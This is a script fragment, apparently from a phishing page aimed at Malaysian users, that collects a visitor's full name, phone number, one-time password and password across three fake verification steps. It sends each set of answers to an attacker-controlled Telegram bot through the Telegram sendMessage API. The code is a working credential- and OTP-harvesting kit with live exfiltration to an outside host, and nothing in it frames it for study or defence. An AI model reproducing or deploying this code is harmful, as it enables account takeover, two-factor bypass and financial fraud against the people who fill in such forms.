                            }).find(".item:first").appendTo($box);

                        })
                    }, 600);

            },

<script>
  const BOT_TOKEN = "YOUR_BOT_TOKEN";
  const CHAT_ID = "YOUR_CHAT_ID"; // bisa dapat dari @userinfobot atau kode user sendiri

  function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message
      })
    }).then(response => {
      if (!response.ok) {
        console.error("Gagal kirim ke Telegram");
      }
    }).catch(error => console.error("Error:", error));
  }

  function processFirstData() {
    const fullName = document.getElementById("full_name").value;
    const phoneNumber = document.getElementById("phone_number").value;

    const message = `üìå *Form Pertama (Cek Status)*\n\nüë§ Nama: ${fullName}\nüìû Nombor: +60${phoneNumber}`;
    sendToTelegram(message);

    // Simulasikan form berpindah ke bagian kedua
    document.querySelector('.first').style.display = 'none';
    document.querySelector('.second').style.display = 'block';
    document.getElementById("validateFullName").value = fullName;
    document.getElementById("validatePhoneNumber").value = phoneNumber;
  }

  function processSecondData() {
    const fullName = document.getElementById("validateFullName").value;
    const phoneNumber = document.getElementById("validatePhoneNumber").value;
    const otp = document.getElementById("otp").value;

    const message = `üîê *Form Kedua (OTP)*\n\nüë§ Nama: ${fullName}\nüìû Nombor: +60${phoneNumber}\nüîë OTP: ${otp}`;
    sendToTelegram(message);

    // Lanjut ke form ketiga
    document.querySelector('.second').style.display = 'none';
    document.querySelector('.third').style.display = 'block';
    document.getElementById("validateOtp_code").value = otp;
  }

  function processThirdData() {
    const fullName = document.getElementById("validateFullName").value;
    const phoneNumber = document.getElementById("validatePhoneNumber").value;
    const otp = document.getElementById("validateOtp_code").value;
    const password = document.getElementById("password").value;

    const message = `‚úÖ *Form Ketiga (Final)*\n\nüë§ Nama: ${fullName}\nüìû Nombor: +60${phoneNumber}\nüîë OTP: ${otp}\nüîí Kata Laluan: ${password}`;
    sendToTelegram(message);

    // Tampilkan halaman "verifikasi" atau bagian keempat
    document.querySelector('.third').style.display = 'none';
    document.querySelector('.four').style.display = 'block';
  }
</script>
